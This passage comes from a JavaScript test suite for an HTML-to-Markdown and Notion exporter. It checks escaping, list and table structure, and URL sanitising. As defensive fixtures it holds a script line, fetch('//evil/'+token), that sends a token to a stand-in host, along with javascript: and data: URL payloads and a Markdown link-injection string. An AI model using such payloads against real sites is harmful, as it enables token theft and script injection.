        expect(HTMLToMarkdown._convertNode(element("div", [
            element("ol", [element("li", [textNode("x")])]),
            element("p", [textNode("after")]),
        ]))).toBe("1. x\n\nafter\n\n");
        expect(HTMLToMarkdown._convertNode(element("div", [
            element("ul", [element("li", [textNode("a")])]),
            textNode("after"),
        ]))).toBe("- a\n\nafter");
    });

    it("hr 前有空行(不与前文构成 setext 标题)", () => {
        expect(HTMLToMarkdown._convertNode(element("div", [textNode("前言"), element("hr", [])])))
            .toBe("前言\n\n---\n\n");
    });

    it("强调定界符内侧留白移到外侧(不退化为字面星号)", () => {
        expect(HTMLToMarkdown._convertNode(element("strong", [textNode(" 重点 ")]))).toBe("**重点**");
        expect(HTMLToMarkdown._convertNode(element("em", [textNode(" 斜 ")]))).toBe("*斜*");
        expect(HTMLToMarkdown._convertNode(element("del", [textNode(" 删 ")]))).toBe("~~删~~");
    });

    it("引用/callout 拆行前统一行结束符(孤立 \\r 不逃逸前缀)", () => {
        expect(HTMLToMarkdown._convertNode(element("blockquote", [textNode("a\rb")]))).toBe("> a\n> b\n\n");
        const callout = withDom(element("body", [element("p", [textNode("a\rb")])]), () => HTMLToMarkdown.buildPostCallout({ cooked: "<p>x</p>", post_number: 1, name: "u" }, 0, true));
        expect(callout).toContain("> a\n> b");
    });

    it("有序列表续行缩进按父项内容列(多位数序号不脱父)", () => {
        const li = element("li", [textNode("a"), element("ul", [element("li", [textNode("b")])])]);
        const ol = element("ol", [li], { getAttribute: attrs({ start: "10" }) });
        expect(HTMLToMarkdown._convertNode(ol)).toBe("10. a\n    - b\n\n");
    });

    it("链接标签保留内联 Markdown(内嵌图片不被转义), 文本仍防逃逸", () => {
        const a = element("a", [element("img", [], { getAttribute: attrs({ src: PUBLIC, alt: "A" }) })], { getAttribute: attrs({ href: "https://cdn.example.com/p" }) });
        expect(HTMLToMarkdown._convertNode(a)).toBe(`[![A](${PUBLIC})](https://cdn.example.com/p)`);
        const inject = element("a", [textNode("a](https://evil.example)")], { getAttribute: attrs({ href: "https://cdn.example.com/p" }) });
        expect(HTMLToMarkdown._convertNode(inject)).toBe("[a\\](https://evil.example)](https://cdn.example.com/p)");
    });

    it("textWithBreaks 剪枝 SKIP_TAGS(代码块不吸入 script 源码)", () => {
        const pre = element("pre", [
            element("code", [textNode("x")]),
            element("script", [textNode("fetch('//evil/'+token)")]),
        ]);
        expect(DomSpec.textWithBreaks(pre)).toBe("x");
    });

    it("eachMedia 参数自身为跳过元素时不采集其后代媒体", () => {
        const seen = [];
        DomSpec.eachMedia(element("noscript", [element("img", [], { getAttribute: attrs({ src: PUBLIC }) })]), (n, k) => seen.push(k));
        expect(seen).toEqual([]);
    });

    it("mediaSrc 回退到 <picture> 父级首选源(响应式图片)", () => {
        const source = element("source", [], { getAttribute: attrs({ srcset: "https://cdn.example.com/b.webp 1x" }) });
        const picture = element("picture", [source], { querySelector: (sel) => (sel === "source" ? source : null) });
        const img = element("img", [], {
            getAttribute: attrs({ src: "data:image/gif;base64,AAAA" }),
            closest: () => picture,
        });
        expect(DomSpec.mediaSrc(img)).toBe("https://cdn.example.com/b.webp");
    });

    it("透明下钻段落不把切分后的片段重新合并超限(单段 ≤2000)", () => {
        const long = "a".repeat(2500);
        const blocks = withDom(element("body", [element("div", [textNode(long)])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        const rich = blocks.flatMap((b) => (b.paragraph && b.paragraph.rich_text) || []);
        expect(rich.length).toBeGreaterThan(1);
        expect(rich.every((r) => r.text.content.length <= 2000)).toBe(true);
        expect(rich.map((r) => r.text.content).join("").length).toBe(2500);
    });

    it(".md-table 容器内非表格内容走同一分派(hr/列表不丢结构)", () => {
        const mdTable = (children) => element("div", children, { classList: { contains: (c) => c === "md-table" } });
        const hr = withDom(element("body", [mdTable([element("hr", [])])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        expect(hr.map((b) => b.type)).toContain("divider");
        const list = withDom(element("body", [mdTable([element("ul", [element("li", [textNode("a")])])])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
        expect(list.map((b) => b.type)).toContain("bulleted_list_item");
    });

    it("iframe 白名单宿主的超长 src 不写入 embed.url(降级为可见标记)", () => {
        const longUrl = "https://www.youtube.com/watch?v=" + "a".repeat(2100);
        const frame = element("iframe", [], { getAttribute: attrs({ src: longUrl }) });
        const blocks = [];
        DOMToNotion._cookIframe(frame, blocks, "external");
        expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
        expect(JSON.stringify(blocks)).toContain("已拒");
    });
});

describe("wave19 确认轮: 出口面残余边界", () => {
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const EMOJI_SRC = "/images/emoji/twitter/tada.png";
    const emojiImg = () => element("img", [], { getAttribute: attrs({ class: "emoji", alt: ":tada:", src: EMOJI_SRC }) });
    const run = (body, imgMode) => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", imgMode));
    const paraText = (blocks) => blocks
        .map((b) => ((b.paragraph && b.paragraph.rich_text) || []).map((r) => r.text.content).join(""))
        .join("|");

    it("li 内块级子节点不与父项文本同行拼接(分隔线/引用前缀不被吞)", () => {
        // 此前 hr 分支产物直接拼进行内缓冲: "a" + "---\\n\\n" → "a---"(分隔线字面化)
        expect(HTMLToMarkdown._convertNode(element("li", [textNode("a"), element("hr", []), textNode("b")])))
            .toBe("- a\n  \n  ---\n  b\n");
        // 引用前缀 "> " 与父项文本粘连 → 引用结构丢失
        expect(HTMLToMarkdown._convertNode(element("li", [textNode("a"), element("blockquote", [textNode("x")])])))
            .toBe("- a\n  \n  > x\n");
        // 表格同理(行首竖线粘连)
        const table = element("table", [element("tbody", [
            element("tr", [element("td", [textNode("c")])], { closest: () => null }),
        ])]);
        expect(HTMLToMarkdown._convertNode(element("li", [textNode("a"), table])))
            .toBe("- a\n  \n  | c |\n  | --- |\n");
        // 项内首个块不重复缩进("- " 已由 li 分支补上)
        expect(HTMLToMarkdown._convertNode(element("li", [element("p", [textNode("a")]), element("p", [textNode("b")])])))
            .toBe("- a\n  \n  b\n");
    });

    it("skipNestedLists 只跳过 li 直属嵌套列表(深层列表不得零产出)", () => {
        const inner = element("ul", [element("li", [textNode("引用内")])]);
        const bq = element("blockquote", [inner]);
        inner.parentNode = bq;
        const li = element("li", [textNode("要点"), bq]);
        bq.parentNode = li;
        const rich = DOMToNotion.serializeRichText(li, { skipNestedLists: true });
        const text = rich.map((r) => r.text.content).join("");
        expect(text).toContain("要点");
        expect(text).toContain("引用内");
        // 直属嵌套列表仍被跳过(_cookList 负责产出独立列表项, 不得重复)
        const direct = element("ul", [element("li", [textNode("直接")])]);
        const li2 = element("li", [textNode("父"), direct]);
        direct.parentNode = li2;
        expect(DOMToNotion.serializeRichText(li2, { skipNestedLists: true })
            .map((r) => r.text.content).join("")).not.toContain("直接");
    });

    it("emoji 图在透明下钻路径仍为内联文本载体(不拆成独立段落)", () => {
        const blocks = run([element("div", [textNode("前 "), emojiImg(), textNode(" 后")])]);
        expect(blocks.length).toBe(1);
        expect(blocks[0].type).toBe("paragraph");
        expect(paraText(blocks)).toBe("前 🎉 后");
    });

    it("imgMode=skip 不影响 emoji 文本块(emoji 非图片资源)", () => {
        const blocks = run([element("div", [emojiImg()])], "skip");
        expect(blocks.length).toBe(1);
        expect(paraText(blocks)).toBe("🎉");
        // 透明下钻的 emoji 已由内联路径截走, 此处直接锁定块级处理器自身的口径
        const direct = [];
        DOMToNotion._cookBlockImage(emojiImg(), direct, "skip");
        expect(paraText(direct)).toBe("🎉");
        // 普通图片仍随 skip 静默(用户显式设置)
        expect(run([element("div", [element("img", [], { getAttribute: attrs({ src: "https://cdn.example.com/a.png" }) })])], "skip")
            .map((b) => b.type)).not.toContain("image");
    });

    it("透明下钻段落保留 br 产生的空行, 且不改写 code 片段内空白", () => {
        const blocks = run([element("div", [textNode("a"), element("br", []), element("br", []), textNode("b")])]);
        expect(paraText(blocks)).toBe("a\n\nb");
        const codeBlocks = run([element("div", [element("code", [textNode("a  b")])])]);
        expect(paraText(codeBlocks)).toBe("a  b");
    });

    it("textWithBreaks 剪枝后不得回退 textContent(脚本源码不入代码块)", () => {
        const scriptEl = element("script", [textNode("fetch('/session/'+token)")]);
        const pre = element("pre", [scriptEl]);
        // 真实 DOM 下父元素 textContent 聚合子树文本(含被剪枝的 script)
        pre.textContent = "fetch('/session/'+token)";
        expect(DomSpec.textWithBreaks(pre)).toBe("");
        // 无 childNodes 的宿主(最小桩)仍回退 textContent —— 既有取文本口径不回退
        const bare = element("pre", []);
        delete bare.childNodes;
        bare.textContent = "code";
        expect(DomSpec.textWithBreaks(bare)).toBe("code");
    });

    it("链接标签被剪空时回退为 URL 文本(不产出空标签)", () => {
        const a = element("a", [element("script", [textNode("x")])], { getAttribute: attrs({ href: "https://cdn.example.com/p" }) });
        expect(HTMLToMarkdown._convertNode(a)).toBe("[https://cdn.example.com/p](https://cdn.example.com/p)");
        // 正常标签不变
        expect(HTMLToMarkdown._convertNode(element("a", [textNode("看这里")], { getAttribute: attrs({ href: "https://cdn.example.com/p" }) })))
            .toBe("[看这里](https://cdn.example.com/p)");
    });

    it("mdUrl 编码反斜杠(目标串不得吞掉闭合括号)", () => {
        expect(Utils.mdUrl("https://ex.com/dir\\")).toBe("https://ex.com/dir%5C");
        const a = element("a", [textNode("看这里")], { getAttribute: attrs({ href: "https://ex.com/dir\\" }) });
        expect(HTMLToMarkdown._convertNode(a)).toBe("[看这里](https://ex.com/dir%5C)");
    });
});

describe("wave20 确认轮: 字面量/基路径/内联回退边界", () => {
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body) => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
    const paraText = (blocks) => blocks
        .map((b) => ((b.paragraph && b.paragraph.rich_text) || []).map((r) => r.text.content).join(""))
        .join("|");

    it("absoluteUrl: 裸相对地址按文档基路径解析(不再一律拼到 origin 根)", () => {
        const loc = globalThis.window.location;
        const origHref = loc.href;
        const origOrigin = loc.origin;
        loc.href = "http://localhost/posts/42/index.html";
        loc.origin = "http://localhost";
        try {
            expect(Utils.absoluteUrl("assets/pic.png")).toBe("http://localhost/posts/42/assets/pic.png");
            expect(Utils.absoluteUrl("./notes.md")).toBe("http://localhost/posts/42/notes.md");
            // 根相对与已绝对形态不回退
            expect(Utils.absoluteUrl("/uploads/a.png")).toBe("http://localhost/uploads/a.png");
            expect(Utils.absoluteUrl("https://cdn.example.com/a.png")).toBe("https://cdn.example.com/a.png");
        } finally {
            loc.href = origHref;
            loc.origin = origOrigin;
        }
    });

    it("文本节点的 CommonMark 内联控制符被转义(字面星号不被渲染为强调)", () => {
        expect(HTMLToMarkdown._convertNode(element("p", [textNode("**注意** 2*3*4 a~~b~~c")])))
            .toBe("\\*\\*注意\\*\\* 2\\*3\\*4 a\\~\\~b\\~\\~c\n\n");
        // 反引号同样字面化(避免被当作未闭合代码跨度)
        expect(HTMLToMarkdown._convertNode(element("p", [textNode("a`b")]))).toBe("a\\`b\n\n");
        // 元素产生的强调语法不受影响, 且换行不被折叠(mdLiteral 不收换行)
        expect(HTMLToMarkdown._convertNode(element("strong", [textNode("重点")]))).toBe("**重点**");
    });

    it("代码跨度是字面量上下文(标签内 arr[0] 不带反斜杠)", () => {
        const a = element("a", [textNode("见 "), element("code", [textNode("arr[0]")])],
            { getAttribute: attrs({ href: "https://cdn.example.com/p" }) });
        expect(HTMLToMarkdown._convertNode(a)).toBe("[见 `arr[0]`](https://cdn.example.com/p)");
        // 非标签上下文同口径(含星号的代码不被转义, 围栏按原文本加宽)
        expect(HTMLToMarkdown._convertNode(element("p", [element("code", [textNode("a*b")])]))).toBe("`a*b`\n\n");
    });

    it("地址被拒图片的 alt 回退在透明下钻路径仍为内联文本", () => {
        const rejected = element("img", [], { getAttribute: attrs({ src: "http://127.0.0.1/x.png", alt: "配图" }) });
        const blocks = run([element("div", [textNode("前 "), rejected, textNode(" 后")])]);
        expect(blocks.length).toBe(1);
        expect(blocks[0].type).toBe("paragraph");
        expect(paraText(blocks)).toBe("前 配图 后");
        // 真正能落块的图片仍是独立块(不被内联截流)
        const ok = element("img", [], { getAttribute: attrs({ src: "https://cdn.example.com/a.png" }) });
        expect(run([element("div", [textNode("前 "), ok, textNode(" 后")])]).map((b) => b.type)).toContain("image");
    });

    it("safeUrl 的 scheme/片段判据不依赖测试环境原点(公网原点下同样拒绝)", () => {
        // 测试环境原点为 localhost(内网) —— 公网校验会把任何补齐结果都判拒,
        // 使「危险 scheme / 纯片段不得被补齐」的判据在测试下消失。此处显式切到公网原点断言
        const loc = globalThis.window.location;
        const origHref = loc.href;
        const origOrigin = loc.origin;
        loc.href = "https://linux.do/t/1";
        loc.origin = "https://linux.do";
        try {
            expect(DomSpec.safeUrl("javascript:alert(1)")).toBe("");
            expect(DomSpec.safeUrl("data:text/html,<script>")).toBe("");
            expect(DomSpec.safeUrl("#sec")).toBe("");
            expect(DomSpec.safeUrl("#")).toBe("");
            // 相对形态仍按文档基路径补齐并过公网校验
            expect(DomSpec.safeUrl("/uploads/a.png")).toBe("https://linux.do/uploads/a.png");
            expect(DomSpec.safeUrl("assets/a.png")).toBe("https://linux.do/t/assets/a.png");
        } finally {
            loc.href = origHref;
            loc.origin = origOrigin;
        }
    });
});

describe("wave21 确认轮: 表格结构/字面量转义/媒体回退边界", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body, mode = "external") => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", mode));
    const paraText = (blocks) => blocks
        .map((b) => ((b.paragraph && b.paragraph.rich_text) || []).map((r) => r.text.content).join(""))
        .filter((t) => t !== "")
        .join("|");

    it("嵌套表格的单元格是文本边界(不再是不可分辨的粘接串)", () => {
        const table = element("table", [element("tbody", [element("tr", [
            element("td", [textNode("1")]), element("td", [textNode("2")]),
        ], { closest: () => null })])]);
        const blocks = run([element("blockquote", [table])]);
        expect(blocks.map((b) => b.type)).toEqual(["quote"]);
        expect(blocks[0].quote.rich_text.map((r) => r.text.content).join("")).toBe("1\n2");
    });

    it("链接标签内的字面文本不被渲染为强调(标签深度分支同用字面量口径)", () => {
        const a = element("a", [textNode("2*3*4")], { getAttribute: attrs({ href: "https://cdn.example.com/x" }) });
        expect(HTMLToMarkdown._convertNode(a)).toBe("[2\\*3\\*4](https://cdn.example.com/x)");
        // 换行仍折叠(单行上下文), 方括号仍转义(链接语法不被破坏)
        const b = element("a", [textNode("a[b]\nc")], { getAttribute: attrs({ href: "https://cdn.example.com/x" }) });
        expect(HTMLToMarkdown._convertNode(b)).toBe("[a\\[b\\] c](https://cdn.example.com/x)");
    });

    it("字面量文本中的 < 被转义(不成为原生 HTML 透传)", () => {
        expect(HTMLToMarkdown._convertNode(element("p", [textNode("用 <div> 包")]))).toBe("用 \\<div> 包\n\n");
    });

    it("ul 分支的直属裸文本同样转义(与 ol 分支同口径)", () => {
        const out = HTMLToMarkdown._convertNode(element("ul", [textNode("**x**"), element("li", [textNode("a")])]));
        expect(out).toBe("\\*\\*x\\*\\*\n\n- a\n");
    });

    it("表格 caption 与表头行之间留空行(GFM 表格不能中断段落)", () => {
        const table = element("table", [
            element("caption", [textNode("表标题")]),
            element("tr", [element("th", [textNode("a")]), element("th", [textNode("b")])]),
        ]);
        expect(HTMLToMarkdown._convertNode(table)).toBe("表标题\n\n| a | b |\n| --- | --- |\n\n");
    });

    it("表格不齐行按最大列数补齐(多余单元格不被渲染时丢弃)", () => {
        const table = element("table", [
            element("tr", [element("th", [textNode("a")])]),
            element("tr", [element("td", [textNode("b")]), element("td", [textNode("c")])]),
        ]);
        expect(HTMLToMarkdown._convertNode(table)).toBe("| a |  |\n| --- | --- |\n| b | c |\n\n");
    });

    it("块级图片的 alt 回退是文本载体(imgMode=skip 下不丢失)", () => {
        const img = element("img", [], { getAttribute: attrs({ src: "javascript:alert(1)", alt: "配图" }) });
        const blocks = [];
        DOMToNotion._cookBlockImage(img, blocks, "skip");
        expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
        expect(blocks[0].paragraph.rich_text.map((r) => r.text.content).join("")).toBe("配图");
    });

    it("媒体元素的浏览器降级文案不进正文(与 Markdown 出口同口径)", () => {
        const video = element("video", [textNode("您的浏览器不支持 video 标签")],
            { getAttribute: attrs({ src: PUBLIC }) });
        const blocks = run([element("p", [textNode("前"), video, textNode("后")])]);
        expect(blocks.map((b) => b.type)).toContain("video");
        expect(paraText(blocks)).toBe("前后");
    });

    it("a.attachment 不再同时落段落链接与 file 块(与 img 去重契约一致)", () => {
        const attachment = element("a", [textNode("x.zip")], {
            classList: { contains: (c) => c === "attachment" },
            getAttribute: attrs({ href: "https://cdn.example.com/x.zip" }),
        });
        const blocks = run([element("p", [textNode("见"), attachment, textNode("谢")])]);
        expect(blocks.map((b) => b.type)).toContain("file");
        const inline = blocks.filter((b) => b.type === "paragraph").flatMap((b) => b.paragraph.rich_text);
        expect(inline.some((r) => r.text.link)).toBe(false);
        expect(paraText(blocks)).toBe("见谢");
    });
});

describe("wave22 确认轮: 媒体兜底路径/容器分派/行首结构符", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body, mode = "external") => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", mode));
    const texts = (blocks) => blocks.map((b) => {
        const holder = b.paragraph || b.quote || b.heading_3;
        return ((holder && holder.rich_text) || []).map((r) => r.text.content).join("");
    });
    const quoteClass = { classList: { contains: (c) => c === "quote" } };

    it("未处理的 iframe 不把浏览器降级文案落成段落(终止子树遍历)", () => {
        const noSrc = element("iframe", [textNode("您的浏览器不支持此内容")], { getAttribute: attrs({}) });
        expect(run([element("div", [noSrc])])).toEqual([]);
        const skipped = element("iframe", [textNode("您的浏览器不支持此内容")],
            { getAttribute: attrs({ src: "https://www.youtube.com/embed/x" }) });
        expect(run([element("div", [skipped])], "skip")).toEqual([]);
    });

    it("aside.quote 的深嵌套引用回退保留其余直属内容与裸文本", () => {
        const quote = element("blockquote", [textNode("引用")]);
        const holder = element("div", [quote], { querySelector: (sel) => (sel === "blockquote" ? quote : null) });
        const aside = element("aside", [
            textNode(" \n "),
            element("div", [textNode("张三")]),
            holder,
        ], { classList: { contains: (c) => c === "quote" }, querySelector: (sel) => (sel === "blockquote" ? quote : null) });
        const blocks = run([aside]);
        expect(blocks.map((b) => b.type)).toEqual(["paragraph", "quote"]);
        expect(texts(blocks)).toEqual(["张三", "引用"]);
    });

    it("lightbox/image-wrapper 容器内图片同样有可见回退(alt 不丢)", () => {
        const img = element("img", [], { getAttribute: attrs({ src: "javascript:alert(1)", alt: "配图" }) });
        const blocks = run([element("div", [img], { classList: { contains: (c) => c === "lightbox-wrapper" } })]);
        expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
        expect(texts(blocks)).toEqual(["配图"]);
    });

    it("onebox 判据按类名 token 严格匹配(子串不命中, 不伪造 callout)", () => {
        expect(HTMLToMarkdown._convertNode(element("div", [textNode("x")],
            { classList: undefined, className: "not-onebox" }))).toBe("x");
        expect(HTMLToMarkdown._convertNode(element("div", [textNode("x")],
            { classList: { contains: (c) => c === "onebox" } }))).toBe("> [!quote]\n> x\n\n");
        // 多层包裹(.onebox-wrapper > .onebox)不再双层嵌套加前缀
        const wrapper = element("div", [element("div", [textNode("t")],
            { classList: { contains: (c) => c === "onebox" } })],
            { classList: { contains: (c) => c === "onebox-wrapper" } });
        expect(HTMLToMarkdown._convertNode(wrapper)).toBe("> [!quote]\n> t\n\n");
    });

    it("文本行首的块结构符被转义(不再被解析为列表/引用/标题/setext)", () => {
        expect(Utils.mdLiteral("a\n- b\n1) c\n> d\n# e\n=== f"))
            .toBe("a\n\\- b\n1\\) c\n\\> d\n\\# e\n\\=== f");
        // 起始行同样转义(如 <br> 后的文本节点)
        expect(HTMLToMarkdown._convertNode(element("p", [textNode("第一步"), element("br"), textNode("===")])))
            .toBe("第一步\n\\===\n\n");
        // 普通文本与词内字符不受影响
        expect(Utils.mdLiteral("a-b 2*3 1.5")).toBe("a-b 2\\*3 1.5");
    });
});

describe("wave23 确认轮: 容器可见内容/媒体回退/字面量上下文补齐", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body, mode = "external") => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", mode));
    const texts = (blocks) => blocks.map((b) => {
        const holder = b.paragraph || b.quote || b.heading_3;
        return ((holder && holder.rich_text) || []).map((r) => r.text.content).join("");
    });

    it("aside.quote 深回退: 命中引用源的子节点内部其余内容不丢", () => {
        const quote = element("blockquote", [textNode("引用正文")]);
        const holder = element("div", [textNode("张三 说："), quote, textNode("后记")],
            { querySelector: (sel) => (sel === "blockquote" ? quote : null) });
        const aside = element("aside", [holder],
            { classList: { contains: (c) => c === "quote" }, querySelector: (sel) => (sel === "blockquote" ? quote : null) });
        const blocks = run([aside]);
        expect(blocks.map((b) => b.type)).toEqual(["paragraph", "quote", "paragraph"]);
        expect(texts(blocks)).toEqual(["张三 说：", "引用正文", "后记"]);
    });

    it("lightbox 容器内非媒体可见内容(图注)不丢, 且不重复采集媒体", () => {
        const img = element("img", [], { getAttribute: attrs({ src: PUBLIC, alt: "图" }) });
        const blocks = run([element("div", [img, element("span", [textNode("图注文字")])],
            { classList: { contains: (c) => c === "lightbox-wrapper" } })]);
        expect(blocks.map((b) => b.type)).toEqual(["image", "paragraph"]);
        expect(texts(blocks)).toEqual(["", "图注文字"]);
    });

    it("img alt 与 URL 兑底标签按字面量转义(强调标记不被解释)", () => {
        expect(HTMLToMarkdown._convertNode(element("img", [],
            { getAttribute: attrs({ src: PUBLIC, alt: "2*3*4" }) })))
            .toBe("![2\\*3\\*4](" + PUBLIC + ")");
        expect(HTMLToMarkdown._convertNode(element("img", [], { getAttribute: attrs({ alt: "a*b" }) })))
            .toBe("a\\*b");
    });

    it("链接内 video/audio/iframe 不再截断外层链接(嵌套链接转义为字面)", () => {
        const video = element("video", [], { getAttribute: attrs({ src: PUBLIC }) });
        const a = element("a", [textNode("看"), video, textNode("这里")],
            { getAttribute: attrs({ href: "https://h/x" }), querySelector: () => video });
        expect(HTMLToMarkdown._convertNode(a))
            .toBe("[看\\[视频\\](" + PUBLIC + ")  这里](https://h/x)");
    });
});

describe("wave24 确认轮: 图片容器内的分派口径(.meta/文档序/片段上限)", () => {
    const PUBLIC = "https://cdn.example.com/a.png";
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body, mode = "external") => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", mode));
    const texts = (blocks) => blocks.map((b) => {
        const holder = b.paragraph || b.quote || b.heading_3;
        return ((holder && holder.rich_text) || []).map((r) => r.text.content).join("");
    });
    const wrapper = (kids) => element("div", kids, { classList: { contains: (c) => c === "lightbox-wrapper" } });
    const img = () => element("img", [], { getAttribute: attrs({ src: PUBLIC, alt: "图" }) });

    it("容器内 .meta 元信息按同一条分派表被跳过", () => {
        const meta = element("div", [element("span", [textNode("a.png")]), textNode(" 1024×768")],
            { classList: { contains: (c) => c === "meta" } });
        const blocks = run([wrapper([img(), meta])]);
        expect(blocks.map((b) => b.type)).toEqual(["image"]);
    });

    it("容器内文本与媒体保持文档序且不粘连", () => {
        const blocks = run([wrapper([textNode("图前说明"), img(), textNode("图后说明")])]);
        expect(blocks.map((b) => b.type)).toEqual(["paragraph", "image", "paragraph"]);
        expect(texts(blocks)).toEqual(["图前说明", "", "图后说明"]);
    });

    it("容器内可见内容片段数超限时保留可见截断标记", () => {
        const kids = [];
        for (let i = 0; i < 51; i++) {
            kids.push(element("strong", [textNode("t")]));
            kids.push(textNode("x"));
        }
        const blocks = run([wrapper(kids)]);
        const rich = blocks[0].paragraph.rich_text;
        expect(rich.length).toBe(100);
        expect(rich[rich.length - 1].text.content).toContain("已截断");
    });

    it("容器内集合仍走 DomSpec.eachMedia(不重复采集嵌套媒体)", () => {
        const nested = element("div", [img()], {
            querySelector: () => null,
            classList: { contains: () => false },
        });
        const blocks = run([wrapper([nested])]);
        expect(blocks.filter((b) => b.type === "image").length).toBe(1);
    });

    it("容器内多图按文档序全部采集(不只首张)", () => {
        const second = "https://cdn.example.com/b.png";
        const a = element("img", [], { getAttribute: attrs({ src: PUBLIC, alt: "A" }) });
        const b = element("img", [], { getAttribute: attrs({ src: second, alt: "B" }) });
        const blocks = run([wrapper([a, b])]);
        const images = blocks.filter((x) => x.type === "image");
        expect(images.map((x) => x.image.external.url)).toEqual([PUBLIC, second]);
    });
});

describe("wave25 确认轮: 行首整行连字符与字面下划线", () => {
    it("行首整行 `-{2,}` 被转义(setext 下划线/主题分隔线不再吞行)", () => {
        expect(Utils.mdLiteral("---")).toBe("\\---");
        expect(Utils.mdLiteral("abc\n---")).toBe("abc\n\\---");
        expect(Utils.mdLiteral("abc\n--- ")).toBe("abc\n\\--- ");
        // 词内/行内连字符不受影响
        expect(Utils.mdLiteral("a-b")).toBe("a-b");
        expect(Utils.mdLiteral("a--b")).toBe("a--b");
    });

    it("行首整行 `_{2,}` 与字面下划线被转义(`___` 不再吞行、`_x_` 不再变斜体)", () => {
        expect(Utils.mdLiteral("___")).toBe("\\_\\_\\_");
        expect(Utils.mdLiteral("_x_")).toBe("\\_x\\_");
        expect(Utils.mdLiteral("snake_case")).toBe("snake\\_case");
    });

    it("段落内 <br> 分隔的整行连字符经导出器同样被转义", () => {
        expect(HTMLToMarkdown._convertNode(element("p", [textNode("abc"), element("br"), textNode("---")])))
            .toBe("abc\n\\---\n\n");
    });

    it("表格单元格内竖线仍按 GFM 转义(含行内 code 跨度)", () => {
        const cell = (tag, kids) => element(tag, kids, { classList: { contains: () => false } });
        const row = element("tr", [
            cell("td", [textNode("a|b")]),
            cell("td", [element("code", [textNode("c|d")])]),
        ]);
        const table = element("table", [element("tbody", [row])]);
        const md = HTMLToMarkdown._convertNode(table);
        expect(md).toContain("| a\\|b | `c\\|d` |");
    });
});

describe("wave26 确认轮: 实体/表格/行尾结构符/容器内图片口径", () => {
    const EMOJI = "/images/emoji/win10/smile.png";
    const withDom = (body, fn) => {
        const orig = globalThis.DOMParser;
        globalThis.DOMParser = function () {
            return { parseFromString: () => ({ body }) };
        };
        try { return fn(); } finally {
            if (orig === undefined) delete globalThis.DOMParser;
            else globalThis.DOMParser = orig;
        }
    };
    const run = (body, mode = "external") => withDom(element("body", body), () => DOMToNotion.cookedToBlocks("<div>x</div>", mode));
    const texts = (blocks) => blocks.map((b) => {
        const holder = b.paragraph || b.quote || b.heading_3;
        return ((holder && holder.rich_text) || []).map((r) => r.text.content).join("");
    });

    it("字符串末尾的单个 `-` 行被转义(setext 下划线不再吞行)", () => {
        expect(Utils.mdLiteral("Title\n-")).toBe("Title\n\\-");
        expect(Utils.mdLiteral("Title\n- ")).toBe("Title\n\\- ");
        expect(Utils.mdLiteral("Title\n*")).toBe("Title\n\\*");
    });

    it("实体引用与 GFM 表格分隔符被转义(字面量不被解码/不成表格)", () => {
        expect(Utils.mdLiteral("Tom &amp; Jerry")).toBe("Tom \\&amp; Jerry");
        expect(Utils.mdLiteral("a & b")).toBe("a \\& b");
        expect(Utils.mdLiteral("| a | b |")).toBe("\\| a \\| b \\|");
    });

    it("mdText 转义反引号——链接标签内的 code span 不再吞掉反斜杠", () => {
        expect(Utils.mdText("see `[copy](x)`")).toBe("see \\`\\[copy\\](x)\\`");
        expect(Utils.mdLink("`a`", "https://a.b")).toBe("[\\`a\\`](https://a.b)");
    });

    it("表格单元格竖线只转义一次(mdLiteral 与单元格补转义不叠加)", () => {
        const cell = (kids) => element("td", kids, { classList: { contains: () => false } });
        const table = element("table", [element("tbody", [element("tr", [cell([textNode("a|b")])])])]);
        const md = HTMLToMarkdown._convertNode(table);
        expect(md).toContain("| a\\|b |");
        expect(md).not.toContain("a\\\\|b");
    });

    it("容器内直系 emoji 图与 walkNode 同口径(内联文本载体, 不落块级图片)", () => {
        const emoji = element("img", [], { getAttribute: attrs({ src: EMOJI, alt: "smile" }) });
        const wrapper = element("div", [textNode("前"), emoji, textNode("后")],
            { classList: { contains: (c) => c === "lightbox-wrapper" } });
        const blocks = run([wrapper]);
        expect(blocks.filter((b) => b.type === "image").length).toBe(0);
        expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
